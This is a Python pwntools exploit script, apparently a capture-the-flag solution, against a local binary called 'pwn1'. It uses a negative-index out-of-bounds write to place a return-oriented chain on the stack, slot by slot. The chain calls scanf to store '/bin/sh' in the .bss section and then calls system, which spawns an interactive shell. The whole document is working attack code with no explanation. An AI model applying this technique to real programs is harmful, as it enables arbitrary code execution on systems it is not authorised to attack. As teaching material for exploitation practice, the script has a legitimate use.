from pwn import *

p = process('./pwn1')
elf = ELF('pwn1')

p.recvuntil('name:\n')
p.sendline('yzq')
system_addr = elf.symbols['system']
bss_addr = elf.bss()
scanf_addr = elf.symbols['__isoc99_scanf']
pop_rdi = 0x400a33
pop_rsi = 0x400a31  #pop rsi;pop r15;ret
ret_addr = 6917529027641081843  #0xa00000000000000d de fu shu
scanf_formot = 0x400AFC

#gdb.attach(p)
#1
p.recvuntil('index:\n')
p.sendline('-%s' % (ret_addr))
p.recvuntil('age:\n')
p.sendline('%s' % (pop_rdi))

#2
p.recvuntil('index:\n')
p.sendline('-%s' % (ret_addr-1))
p.recvuntil('age:\n')
p.sendline('%s' % (scanf_formot))

#3
p.recvuntil('index:\n')
p.sendline('-%s' % (ret_addr-2))
p.recvuntil('age:\n')
p.sendline('%s' % (pop_rsi))

#4
p.recvuntil('index:\n')
p.sendline('-%s' % (ret_addr-3))
p.recvuntil('age:\n')
p.sendline('%s' % (bss_addr))

#5
p.recvuntil('index:\n')
p.sendline('-%s' % (ret_addr-4))
p.recvuntil('age:\n')
p.sendline('%s' % (0x1))

#6
p.recvuntil('index:\n')
p.sendline('-%s' % (ret_addr-5))
p.recvuntil('age:\n')
p.sendline('%s' % (scanf_addr))

#7
p.recvuntil('index:\n')
p.sendline('-%s' % (ret_addr-6))
p.recvuntil('age:\n')
p.sendline('%s' % (pop_rdi))

#8
p.recvuntil('index:\n')
p.sendline('-%s' % (ret_addr-7))
p.recvuntil('age:\n')
p.sendline('%s' % (bss_addr))

#9
p.recvuntil('index:\n')
p.sendline('-%s' % (ret_addr-8))
p.recvuntil('age:\n')
p.sendline('%s' % (system_addr))

#10
p.recvuntil('index:\n')
p.sendline('0')
p.recvuntil('age:\n')
p.sendline('0')

p.sendline('/bin/sh')

p.interactive()
